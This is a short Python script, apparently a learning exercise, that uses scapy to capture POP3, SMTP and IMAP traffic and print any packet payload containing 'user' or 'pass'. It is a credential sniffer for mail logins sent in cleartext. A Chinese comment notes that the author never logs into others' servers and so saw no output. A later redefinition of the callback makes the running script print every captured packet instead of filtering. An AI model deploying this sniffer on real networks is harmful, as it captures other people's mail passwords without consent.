from scapy.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet=str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print("[*] server:%s" % packet[IP].dst)
            print("[*] %s"%packet[TCP].payload)
            
def packet_callback(packet):
    print(packet.show())

# sniff(prn=packet_callback,count=1)
# 由于我根本都没有要登陆到别人的邮件服务器，所以，也不会产生结果
# pop3 110 IMAP 143 smtp 25
sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',prn=packet_callback,store=0)